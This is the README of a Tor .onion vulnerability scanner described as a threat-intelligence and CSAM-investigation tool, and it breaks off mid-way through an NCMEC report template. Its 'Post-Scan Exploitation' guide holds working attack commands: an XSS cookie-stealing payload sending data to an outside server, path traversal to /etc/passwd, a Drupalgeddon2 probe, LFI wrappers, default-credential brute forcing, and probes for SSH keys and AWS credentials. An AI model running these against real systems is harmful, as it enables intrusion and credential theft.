# DarkWeb Vulnerability Scanner

**Threat Intel tool for scanning .onion infrastructure**

Developed for legitimate threat intelligence operations, red team assessments, and forensic investigation of dark web infrastructure. This scanner conducts text-only analysis of Tor hidden services to identify security misconfigurations, exposed sensitive files, and indicators of criminal networks.

## Features

- Full Tor integration with SOCKS5 proxy support
- 22 modular vulnerability checks — enable/disable individually
- Interactive CLI + non-interactive batch mode
- No media download — text-only analysis
- Circuit rotation with User-Agent randomization
- Rate limit and ban detection with auto-recovery
- Crash recovery — resume interrupted scans
- Multi-format reporting (JSON, text, CSV, Markdown)
- Cross-site identity correlation (emails, wallets, Session IDs, PGP keys)
- Context-aware CSAM/Com764 detection with false positive filtering

## Quick Installation

```bash
# Clone the repository
git clone https://github.com/ekomsSavior/darkweb_scanner.git
cd darkweb_scanner

# Install dependencies
sudo apt update
sudo apt install tor torify python3-pip -y
pip3 install -r requirements.txt --break-system-packages

# Configure Tor for .onion resolution
sudo nano /etc/tor/torrc
```

## Tor Configuration

Add or uncomment these lines in `/etc/tor/torrc`:

```
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
DNSPort 5353
DNSListenAddress 127.0.0.1
AutomapHostsOnResolve 1
AutomapHostsSuffixes .exit,.onion
```

Restart Tor:
```bash
sudo systemctl restart tor
sudo systemctl enable tor
```

## Usage

### Interactive Mode

Start the scanner:
```bash
python3 vulnscan.py
```

### Batch Mode

Run without interaction:
```bash
# Single target
python3 vulnscan.py -t http://target.onion --batch

# Target list
python3 vulnscan.py -T targets.txt --batch

# Full options
python3 vulnscan.py -T targets.txt --batch -d 2 --delay 2 --timeout 20 -r all
```

Batch mode flags:

| Flag | Description |
|------|-------------|
| `-t <url>` | Single target URL |
| `-T <file>` | Target list file (one per line) |
| `-d <n>` | Crawl depth (default: 1) |
| `--delay <n>` | Delay between requests in seconds |
| `--timeout <n>` | Request timeout in seconds |
| `-r <fmt>` | Report format: json, text, csv, md, all |
| `--batch` | Run non-interactive |

### Available Commands

| Command | Description |
|---------|-------------|
| **Target Management** | |
| `targets` | Show all loaded targets |
| `add <url>` | Add a target .onion URL |
| `load <file>` | Load targets from file (one per line) |
| `remove <n>` | Remove target by number |
| `clear` | Clear all targets |
| **Check Control** | |
| `checks` | List all 22 checks with on/off status |
| `enable <n\|all>` | Enable a check or all checks |
| `disable <n\|all>` | Disable a check or all checks |
| `only <1,5,7>` | Enable ONLY listed checks, disable the rest |
| **Configuration** | |
| `config` | Show current scan configuration |
| `set <key> <val>` | Set config value (delay, threads, timeout, max_depth, etc.) |
| **Scanning** | |
| `scan` | Start scanning all loaded targets |
| `quickscan <url>` | One-command scan of a single target |
| `resume` | Resume an interrupted scan |
| **Reports & Intel** | |
| `report [fmt]` | Generate report (text, json, csv, md, all) |
| `identifiers` | Show all extracted identifiers with cross-site flags |
| **OPSEC** | |
| `rotate` | Manually rotate Tor circuit |
| `status` | Show scanner status, circuit count, interrupted scans |
| `exit` | Exit the scanner |

### Example Workflow

```
vulnscan> add http://target.onion
vulnscan> checks
vulnscan> only 1,2,3,5,8,12
vulnscan> set delay 2
vulnscan> set max_depth 2
vulnscan> scan
vulnscan> identifiers
vulnscan> report all
vulnscan> exit
```

### Quick Scan

```
vulnscan> quickscan http://target.onion
```

Clears targets, scans one URL with all enabled checks, done.

---

## All 22 Checks

The scanner runs checks in this order. Each can be toggled on/off independently.

### Reconnaissance

| # | Check | Description |
|---|-------|-------------|
| 1 | **Site Checker** | Verifies target is reachable before wasting time on other checks |
| 2 | **Clone/Mirror Detector** | SHA256 + structural hashing to detect duplicate sites across targets |
| 3 | **Page Metadata** | Extracts titles, meta tags, author disclosure, language/timezone hints, HTML comments, error page fingerprinting |

### Infrastructure Analysis

| # | Check | Description |
|---|-------|-------------|
| 4 | **HTTP Security Headers** | HSTS, CSP (with strength analysis), X-Frame-Options, Cache-Control, 15+ info-leak headers |
| 5 | **SSL/TLS Certificate Analyzer** | Extracts real domains, org names, SANs from certs. Detects .onion→clearnet redirects |
| 6 | **Technology Fingerprint** | CMS detection (WordPress, Drupal, Joomla) and server software from headers/HTML |
| 7 | **Tech Stack Analysis** | Programming languages, frameworks, libraries from headers and page content |
| 8 | **Cookie Analyzer** | Security flags (Secure, HttpOnly, SameSite), session tokens, tracking cookies |
| 9 | **WAF Detector** | Identifies Cloudflare, Akamai, ModSecurity, Sucuri, Imperva + active SQLi blocking test |
| 10 | **HTTP Method Enumeration** | Probes PUT, DELETE, TRACE, OPTIONS for dangerous methods |
| 11 | **CORS Misconfiguration** | Tests wildcard origins, origin reflection, null origin acceptance, credential leaks |

### Vulnerability Scanning

| # | Check | Description |
|---|-------|-------------|
| 12 | **Robots & Sitemap Intel** | Parses robots.txt disallowed paths and sitemap.xml URLs — what admins hide |
| 13 | **Sensitive Files** | 160+ paths (.git, .env, backups, configs, admin panels) with SPA false-positive filtering |
| 14 | **Directory Listing** | Tests 13 common directories for open directory browsing |
| 15 | **Open Redirect Detection** | Tests 15 redirect parameters and 12 redirect endpoints with canary URL |
| 16 | **Form Detector** | Finds login forms, file upload forms, hidden inputs (CSRF tokens, session IDs) |
| 17 | **JavaScript Analyzer** | Extracts API endpoints, hardcoded keys/tokens/credentials, WebSocket URLs, referenced domains |

### Content & Intelligence

| # | Check | Description |
|---|-------|-------------|
| 18 | **Link Crawler** | Follows links to configurable depth, discovers .onion references, flags interesting paths |
| 19 | **Com/764 Network Detector** | Context-aware CSAM keyword detection with false positive filtering. 70+ keywords from CAHN/FBI/Europol |
| 20 | **Session ID Tracker** | Extracts Session messenger IDs and correlates across targets |
| 21 | **Identity Extractor** | Emails, BTC/ETH/XMR wallets, Telegram, Discord, Wickr, PGP fingerprints, .onion links — all cross-site correlated |
| 22 | **PGP Key Extractor** | Full PGP public key blocks, fingerprints, UIDs (Name \<email\>), key IDs, keyserver references |

---

## Scan Engine Features

### Rate Limit & Ban Detection

The scan engine automatically detects when a target is fighting back:

- **429 Too Many Requests** — pauses 15 seconds, rotates Tor circuit, continues
- **403 + block signature** — detects WAF blocks (Cloudflare, DDoS-Guard, etc.), rotates circuit
- **503 + captcha/challenge** — flags the target as requiring human verification
- **3+ consecutive check failures** — assumes blocking, rotates circuit automatically

### Crash Recovery

Scan state is saved to `state/scan_state.json` after every target. If the process dies:

```
$ python3 vulnscan.py
[!] Interrupted scan detected from 2025-03-20 14:32:01
    15/40 targets completed, 25 remaining
    Resume? (y/n):
```

Type `y` to pick up where you left off. Type `n` to discard and start fresh.

### Circuit Rotation & User-Agent Randomization

- Tor circuits rotate every N requests (configurable, default 10)
- User-Agent string randomizes on every circuit rotation
- Manual rotation: `rotate` command
- All configurable via `config/settings.py`

---

## Reporting

Four report formats, generated to the `reports/` directory:

### Markdown (`report md`)
Human-readable with severity icons, findings grouped by check, cross-site identifier correlation section.

### JSON (`report json`)
Machine-readable with full metadata, summary, cross-site identifiers, and all finding data.

### Text (`report text`)
Plain text with severity tags, cross-site section, detailed findings per target.

### CSV (`report csv`)
Spreadsheet format: Target, Check, Severity, Finding, Detail, URL.

### All at once (`report all`)
Generates JSON + text + CSV + Markdown simultaneously.

---

## Cross-Site Identity Correlation

When scanning multiple targets, the scanner tracks identifiers across sites:

- Same email on two .onion sites = likely same operator
- Same BTC wallet = same financial backend
- Same Session ID = same person active on both sites
- Same PGP fingerprint = cryptographic proof of identity linkage

The `identifiers` command shows everything extracted with cross-site flags. Reports include a dedicated cross-site correlation section.

---

## Customizing Wordlists

**You should customize these for your specific targets.**

Threat actors change their language, directory structures, and hiding spots. A wordlist that worked last month might miss things today.

### `wordlists/sensitive_paths.txt`
160+ file paths to probe. Add your own — one path per line, `#` for comments.

### `wordlists/com764_keywords.txt`
70+ CSAM/exploitation keywords from CAHN, FBI, and Europol advisories. Supplements the built-in detector keywords.

The scanner loads these files at startup. No code changes needed—just edit and re-run.

---

## Configuration

Edit `config/settings.py` for persistent changes:

```python
# Tor connection
TOR_PROXY_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = None  # Set if using password auth

# Scan defaults
DEFAULT_SCAN_CONFIG = {
    'delay': 1,           # Seconds between requests
    'threads': 1,         # 1 = sequential
    'timeout': 15,        # Request timeout
    'rotate_circuit_every': 10,
    'max_depth': 1,       # Crawl depth (1 = homepage only)
    'follow_redirects': True,
    'verify_ssl': False,
}
```

Or set values at runtime:
```
vulnscan> set delay 3
vulnscan> set max_depth 2
vulnscan> set timeout 20
```

---

## Project Structure

```
darkweb_scanner/
├── vulnscan.py                  # CLI + batch mode entry point
├── requirements.txt             # pip dependencies
├── config/
│   └── settings.py              # Tor, scan defaults, User-Agents
├── core/
│   ├── tor_session.py           # SOCKS5 proxy, circuit rotation, UA randomization
│   ├── scan_engine.py           # Orchestration, rate limit detection, crash recovery
│   ├── scan_state.py            # State persistence for crash recovery
│   ├── target_manager.py        # Target loading/management
│   └── report_builder.py        # JSON/text/CSV/Markdown export
├── checks/
│   ├── base_check.py            # Abstract base class
│   ├── site_checker.py          # Reachability check
│   ├── clone_detector.py        # Duplicate site detection
│   ├── page_metadata.py         # Titles, meta, language, timezone, comments
│   ├── security_headers.py      # Headers + CSP analysis + cache + info leaks
│   ├── ssl_analyzer.py          # TLS cert intel extraction
│   ├── fingerprint.py           # CMS/server detection
│   ├── tech_stack.py            # Framework/language detection
│   ├── cookie_analyzer.py       # Cookie security audit
│   ├── waf_detector.py          # WAF identification + active test
│   ├── http_methods.py          # PUT/DELETE/TRACE enumeration
│   ├── cors_check.py            # CORS misconfiguration testing
│   ├── robots_sitemap.py        # robots.txt + sitemap.xml parsing
│   ├── sensitive_files.py       # 160+ path enumeration with SPA filtering
│   ├── directory_listing.py     # Open directory detection
│   ├── open_redirect.py         # Redirect vulnerability testing
│   ├── form_detector.py         # Login/upload/hidden input detection
│   ├── js_extractor.py          # JS endpoint/key/credential extraction
│   ├── link_crawler.py          # Link following + .onion discovery
│   ├── com764_detector.py       # Context-aware CSAM detection
│   ├── session_id_tracker.py    # Session messenger ID correlation
│   ├── identity_extractor.py    # Multi-identifier extraction + correlation
│   ├── pgp_extractor.py         # PGP key block/fingerprint extraction
│   └── port_scan.py             # Optional nmap via proxychains (disabled)
├── wordlists/
│   ├── sensitive_paths.txt      # 160+ sensitive file paths
│   └── com764_keywords.txt      # 70+ CSAM/Com764 keywords
├── data/
│   ├── targets.txt              # Sample targets
│   └── exclude_list.txt         # Safe URLs to skip
├── reports/                     # Generated scan reports
├── state/                       # Crash recovery state files
└── utils/
    ├── helpers.py               # URL normalization, risk scoring
    ├── validators.py            # .onion validation, input sanitization
    └── parsers.py               # PDF/JSON parsing, identifier extraction
```

---

## Post-Scan Exploitation & Intelligence Gathering Guide

After identifying vulnerabilities with the scanner, here are manual techniques and tool recommendations to further investigate darkweb sites across different technology stacks.

---

### 1. Missing Security Headers Exploitation

#### HSTS Missing (Medium)
If a site lacks HTTP Strict Transport Security, you can attempt protocol downgrade attacks:

```bash
# Force HTTP connection to see if site accepts insecure connections
curl -k -L --proxy socks5h://127.0.0.1:9050 http://target.onion

# Check if HTTPS is even supported
curl -k -L --proxy socks5h://127.0.0.1:9050 https://target.onion

# If both work, test for session token leakage over HTTP
curl -v --proxy socks5h://127.0.0.1:9050 http://target.onion/login
```

#### CSP Missing (Medium)
Without Content Security Policy, test for XSS vulnerabilities:

```bash
# Basic XSS payload test
curl --proxy socks5h://127.0.0.1:9050 "http://target.onion/search?q=<script>alert(1)</script>"

# Try to steal cookies with XSS (requires finding an injection point first)
# Payload: <script>fetch('http://yourserver/steal?cookie='+document.cookie)</script>
```

#### X-Frame-Options Missing (Clickjacking)
Test if site can be framed:

```bash
# Create a simple HTML test page
cat > clickjack_test.html << EOF
<html>
<head><title>Clickjack Test</title></head>
<body>
  <iframe src="http://target.onion" width="800" height="600"></iframe>
  <p>If you see the site above, it's vulnerable to clickjacking</p>
</body>
</html>
EOF

# Serve it locally and access through Tor Browser
python3 -m http.server 8080
# Then visit http://127.0.0.1:8080/clickjack_test.html in Tor Browser
```

#### CORS Misconfiguration
If the scanner flags wildcard or reflected origins:

```bash
# Test origin reflection
curl -H "Origin: https://evil.com" -I --proxy socks5h://127.0.0.1:9050 http://target.onion/api/

# Check for credential leakage with CORS
curl -H "Origin: https://evil.com" --proxy socks5h://127.0.0.1:9050 http://target.onion/api/user -v 2>&1 | grep -i "access-control"

# Test null origin (sandboxed iframe bypass)
curl -H "Origin: null" -I --proxy socks5h://127.0.0.1:9050 http://target.onion/api/
```

#### Open Redirect
If the scanner finds open redirects:

```bash
# Verify the redirect manually
curl -I --proxy socks5h://127.0.0.1:9050 "http://target.onion/login?next=https://evil.com"

# Chain with XSS for credential theft
# http://target.onion/redirect?url=javascript:alert(document.cookie)
```

---

### 2. Web Server Fingerprinting & Exploitation

#### Nginx-Specific Intelligence
```bash
# Check nginx version from headers
curl -I --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i server

# Common nginx paths to check
for path in /nginx_status /status /metrics /nginx.conf .nginx.conf; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$path" | head -20
done

# Check for nginx alias traversal vulnerability
curl --proxy socks5h://127.0.0.1:9050 "http://target.onion/assets../etc/passwd"

# Test for off-by-slash path traversal
curl --proxy socks5h://127.0.0.1:9050 "http://target.onion/assets../assets/"

# Look for nginx default error pages that reveal paths
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/nonexistent" | grep -i nginx
```

#### Apache2-Specific Intelligence
```bash
# Check Apache version
curl -I --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i server

# Check for mod_status exposure
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/server-status"
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/server-info"

# Check for .htaccess access
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/.htaccess"
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/.htpasswd"

# Test for CGI exposure
for cgi in /cgi-bin/test.cgi /cgi-bin/printenv /cgi-bin/php; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$cgi" | head -20
done

# Check for Apache Tomcat instances
for path in /manager/html /host-manager/html /examples; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion:8080$path" | head -5
done
```

#### IIS-Specific Intelligence
```bash
# Check IIS version
curl -I --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i server

# Check for asp.net debug pages
for path in /trace.axd /elmah.axd /web.config /bin; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$path" | head -20
done

# Test for short filename disclosure (IIS 8.3)
for i in {a..z}; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/*~1*$i*" -I | head -1
done
```

---

### 3. Database Exposure & Exploitation

#### MySQL/MariaDB Intelligence
```bash
# Check for phpMyAdmin
for path in /phpmyadmin /pma /myadmin /phpMyAdmin /mysql /db; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$path/" | grep -i "phpmyadmin\|welcome"
done

# Check for MySQL error exposure
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/index.php?id=1'" | grep -i "mysql\|sql"

# Look for SQL backup files
for file in .sql .bak .backup .dump .sql.gz; do
  for name in backup db database data sql mysql; do
    curl -I --proxy socks5h://127.0.0.1:9050 "http://target.onion/$name$file"
  done
done

# Check for MySQL connection strings in JS files
wget --proxy=on -e use_proxy=yes -e http_proxy=socks5h://127.0.0.1:9050 \
  -r -l2 -A.js http://target.onion/
grep -r -E "(mysql://|mysqli_connect|mysql_connect|localhost.*root)" ./
```

#### PostgreSQL Intelligence
```bash
# Check for pgAdmin
for path in /pgadmin /phppgadmin /pgsql /postgres; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$path/" | grep -i "pgadmin\|postgres"
done

# Look for PostgreSQL connection strings
grep -r -E "(postgresql://|postgres://|PGPASSWORD|PGUSER)" ./
```

#### MongoDB Intelligence
```bash
# Check for MongoDB web interfaces
for port in 27017 27018 28017; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion:$port/" | head -10
done

# Look for MongoDB connection strings
grep -r -E "(mongodb://|mongo://|MONGO_URI)" ./
```

---

### 4. CMS-Specific Intelligence

#### WordPress
```bash
# Check for WordPress
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i "wp-content\|wp-includes"

# WordPress vulnerability scanning through Tor
wpscan --url http://target.onion --proxy socks5h://127.0.0.1:9050 --enumerate u,vp

# Check for wp-config.php access
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/wp-config.php

# List users
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/wp-json/wp/v2/users | jq .

# Check for XML-RPC
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/xmlrpc.php -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>"
```

#### Joomla
```bash
# Check for Joomla
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i "joomla"

# Check for configuration.php
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/configuration.php

# Joomla vulnerability scan
joomscan --url http://target.onion --proxy socks5h://127.0.0.1:9050
```

#### Drupal
```bash
# Check for Drupal
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i "drupal\|sites/default"

# Check for settings.php
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/sites/default/settings.php

# Drupalgeddon2 test
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup"
```

---

### 5. Gatsby.js Specific Intelligence

Gatsby sites often leak valuable information:

```bash
# Check for exposed page-data (contains site structure)
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/page-data/ | grep -o '"path":"[^"]*"'

# Look for component chunks (may contain hardcoded credentials)
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/page-data/app-data.json

# Check for GraphQL endpoint
curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion/___graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# If GraphQL is enabled, dump entire schema
cat > graphql_query.txt << EOF
{"query":"{__schema{types{name,fields{name,type{name}}}}}"}
EOF

curl -X POST --proxy socks5h://127.0.0.1:9050 http://target.onion/___graphql \
  -H "Content-Type: application/json" \
  -d @graphql_query.txt

# Extract JavaScript bundles and search for secrets
wget --proxy=on -e use_proxy=yes -e http_proxy=socks5h://127.0.0.1:9050 \
  -r -l1 -A.js http://target.onion/

grep -r -E "(api[_-]?key|secret|token|password|aws|AKIA)" ./target.onion/
```

---

### 6. Python/Flask/Django Intelligence

```bash
# Check for Flask
curl -I --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i "flask"

# Look for debug mode
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/notfound" | grep -i "debug"

# Check for Werkzeug debugger
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/console" | grep -i "werkzeug"

# Django admin finder
for path in /admin /dashboard /manage /backend; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion$path/" | grep -i "django"
done

# Check for Django settings exposure
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/settings.py"
```

---

### 7. PHP-Specific Intelligence

```bash
# Check for PHP version
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/phpinfo.php"
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/info.php"
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/test.php"

# Check for PHP session files
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/sessions/"
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/tmp/"

# PHP wrapper exploitation if LFI found
# Example: php://filter/convert.base64-encode/resource=index.php
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/page?file=php://filter/convert.base64-encode/resource=config.php"

# Check for PHPMyAdmin setup
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/phpmyadmin/setup"
```

---

### 8. Node.js/Express Intelligence

```bash
# Check for Express
curl -I --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i "x-powered-by"

# Look for package.json
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/package.json"

# Check for .env file
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/.env"

# Look for server.js/app.js
for file in server.js app.js index.js main.js; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/$file" | head -20
done

# Check for node_modules exposure
curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/node_modules/"
```

---

### 9. Directory & File Brute Forcing

Beyond the scanner's default wordlist, use targeted wordlists:

```bash
# Install tools if needed
sudo apt update && sudo apt install gobuster dirb wfuzz -y

# Use gobuster through Tor
export HTTP_PROXY=socks5h://127.0.0.1:9050
export HTTPS_PROXY=socks5h://127.0.0.1:9050

# Common dark web directories
gobuster dir -u http://target.onion -w /usr/share/wordlists/dirb/common.txt -t 5

# Check for admin panels
gobuster dir -u http://target.onion -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -p /usr/share/wordlists/dirb/big.txt

# Technology-specific wordlists
cat > tech_paths.txt << EOF
# PHP
/phpinfo.php
/info.php
/test.php
/php.ini
/.user.ini

# Python
/console
/__pycache__
/.python-version
/requirements.txt
/Pipfile

# Node
/package.json
/package-lock.json
/yarn.lock
/node_modules
/.npmrc

# Git
/.git/config
/.git/HEAD
/.git/index
/.gitignore

# Docker
/Dockerfile
/.dockerignore
/docker-compose.yml

# AWS
/.aws/credentials
/.aws/config

# SSH
/.ssh/id_rsa
/.ssh/authorized_keys
/.ssh/config

# Databases
/.sql
/.db
/.sqlite
/.mysql_history
/.psql_history
EOF

gobuster dir -u http://target.onion -w tech_paths.txt -t 5
```

---

### 10. Admin Panel Discovery

Common admin paths to check manually:

```bash
# Test each path manually
for path in admin administrator adminpanel dashboard manage control backend cms wp-admin; do
  echo -n "Checking /$path... "
  curl -s -o /dev/null -w "%{http_code}" --proxy socks5h://127.0.0.1:9050 \
    "http://target.onion/$path/" && echo ""
done

# Check for default credentials
for cred in admin:admin admin:password admin:123456 administrator:admin root:root; do
  username=$(echo $cred | cut -d: -f1)
  password=$(echo $cred | cut -d: -f2)

  # For basic auth
  curl -u $username:$password --proxy socks5h://127.0.0.1:9050 \
    "http://target.onion/admin/" -I
done

# Test common CMS logins
for path in /wp-login.php /administrator /user/login /login.php; do
  curl -X POST --proxy socks5h://127.0.0.1:9050 \
    -d "log=admin&pwd=admin" \
    "http://target.onion$path" -I
done
```

---

### 11. Hidden Page Discovery via Client-Side Routes

Gatsby, React, Vue and other SPAs often have hidden routes in JavaScript:

```bash
# Download all JavaScript files
wget --proxy=on -e use_proxy=yes -e http_proxy=socks5h://127.0.0.1:9050 \
  -r -l2 -A.js,js.map http://target.onion/

# Extract routes from JS files
find target.onion -name "*.js" -exec grep -o -E "path:['\"]([^'\"]+)['\"]|route:['\"]([^'\"]+)['\"]" {} \; | sort -u

# Look for React Router routes
grep -r -E "path=['\"]\/[a-zA-Z0-9_\/-]+['\"]" target.onion/

# Vue routes
grep -r -E "name: ['\"][a-zA-Z0-9_-]+['\"]" target.onion/

# Angular routes
grep -r -E "path: ['\"][a-zA-Z0-9_\/-]+['\"]" target.onion/

# Extract all strings that look like URLs
find target.onion -name "*.js" -exec strings {} \; | grep -E "https?://[^\"'\\s]+" | sort -u

# Look for API endpoints
grep -r -E "fetch\(['\"]([^'\"]+)['\"]|axios\.(get|post)\(['\"]([^'\"]+)['\"]" target.onion/
```

---

### 12. Environment Variable Exposure

Check JavaScript bundles and config files for leaked secrets:

```bash
# Download and search JS files
wget --proxy=on -e use_proxy=yes -e http_proxy=socks5h://127.0.0.1:9050 \
  -r -l2 -A.js http://target.onion/

# Search for common environment variable patterns
grep -r -E "(API_KEY|SECRET|PASSWORD|TOKEN|AKIA|sk_live|pk_live|GATSBY_|REACT_APP_|VUE_APP_|NEXT_PUBLIC_)" target.onion/

# Look for .env patterns in JS
grep -r -E "process\.env\.[A-Z_]+" target.onion/

# Search for base64 encoded credentials
find target.onion -name "*.js" -exec grep -E "([A-Za-z0-9+/]{40,}={0,2})" {} \;

# Check for hardcoded AWS keys
grep -r -E "AKIA[0-9A-Z]{16}" target.onion/

# Check for JWT tokens
grep -r -E "eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+" target.onion/
```

---

### 13. IDOR (Insecure Direct Object Reference) Testing

If you find any dynamic routes like `/user/123` or `/post/456`:

```bash
# Create a list of potential IDs to test
seq 1 100 > ids.txt

# Test each ID
while read id; do
  echo -n "Checking /user/$id... "
  curl -s -o /dev/null -w "%{http_code}\n" --proxy socks5h://127.0.0.1:9050 \
    "http://target.onion/user/$id"
done < ids.txt | grep -v "404"

# Test for GUIDs/UUIDs
cat > uuids.txt << EOF
00000000-0000-0000-0000-000000000000
11111111-1111-1111-1111-111111111111
12345678-1234-1234-1234-123456789012
aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
ffffffff-ffff-ffff-ffff-ffffffffffff
EOF

while read uuid; do
  curl -s --proxy socks5h://127.0.0.1:9050 "http://target.onion/user/$uuid" -I | head -1
done < uuids.txt

# Test for path traversal in file downloads
for traversal in ../../../etc/passwd ..\\..\\..\\windows\\win.ini ....//....//....//etc/passwd; do
  echo -n "Testing $traversal... "
  curl -s --proxy socks5h://127.0.0.1:9050 \
    "http://target.onion/download?file=$traversal" | head -20
done

# Test for parameter pollution
curl -s --proxy socks5h://127.0.0.1:9050 \
  "http://target.onion/api/user?id=1&id=2" | jq .
```

---


### 14. Cross-Site Correlation

Build a network graph of related sites:

```bash
# Create a script to correlate identifiers
cat > correlate.sh << 'EOF'
#!/bin/bash
TARGET=$1
echo "Analyzing $TARGET..."

# Get all identifiers
curl -s --proxy socks5h://127.0.0.1:9050 $TARGET > page.html

# Extract all identifiers
emails=$(grep -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" page.html | sort -u)
btc=$(grep -o -E "\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b" page.html | sort -u)
xmr=$(grep -o -E "\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b|\b8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b" page.html | sort -u)
session_ids=$(grep -o -E "05[a-f0-9]{62,64}" page.html | sort -u)
telegram=$(grep -o -E "t\.me/[a-zA-Z0-9_]+|@[a-zA-Z0-9_]{5,}" page.html | sort -u)
discord=$(grep -o -E "discord\.gg/[a-zA-Z0-9]+" page.html | sort -u)
onions=$(grep -o -E "[a-zA-Z0-9]{56}\.onion" page.html | sort -u)
pgp=$(grep -o -E "-----BEGIN PGP PUBLIC KEY BLOCK-----" page.html | wc -l)

echo "Emails: $emails"
echo "BTC: $btc"
echo "XMR: $xmr"
echo "Session IDs: $session_ids"
echo "Telegram: $telegram"
echo "Discord: $discord"
echo "Linked .onions: $onions"
echo "PGP Keys: $pgp"

# Save for correlation
echo "$TARGET|$emails|$btc|$xmr|$session_ids|$telegram|$discord" >> correlation_db.txt
EOF

chmod +x correlate.sh

# Run against multiple targets
./correlate.sh http://target1.onion
./correlate.sh http://target2.onion

# Find common identifiers
echo "=== Common Emails ==="
cat correlation_db.txt | grep -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort | uniq -c | sort -nr

echo "=== Common BTC Wallets ==="
cat correlation_db.txt | grep -o -E "\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b" | sort | uniq -c | sort -nr

echo "=== Common Session IDs ==="
cat correlation_db.txt | grep -o -E "05[a-f0-9]{62,64}" | sort | uniq -c | sort -nr
```

---

### 15. Reporting to Authorities

When you find evidence, format it properly:

```bash
# Generate NCMEC CyberTipline format
cat > ncmec_report.txt << EOF
Date: $(date +%Y-%m-%d)
URL: http://target.onion

FINDINGS:
$(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i -E "child|cp|lolita|764|pedo|young|teen|preteen" | head -20)

IDENTIFIERS:
Emails: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u | tr '\n' ',')
BTC Wallets: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b|\bbc1[a-zA-Z0-9]{38,}\b" | sort -u | tr '\n' ',')
XMR Wallets: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b|\b8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b" | sort -u | tr '\n' ',')
Session IDs: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "05[a-f0-9]{62,64}" | sort -u | tr '\n' ',')
Telegram: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "t\.me/[a-zA-Z0-9_]+|@[a-zA-Z0-9_]{5,}" | sort -u | tr '\n' ',')
Discord: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "discord\.gg/[a-zA-Z0-9]+" | sort -u | tr '\n' ',')

TECHNICAL DETAILS:
Server: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion -I | grep -i server)
Generator: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i generator | head -1)

LINKED .ONION SITES:
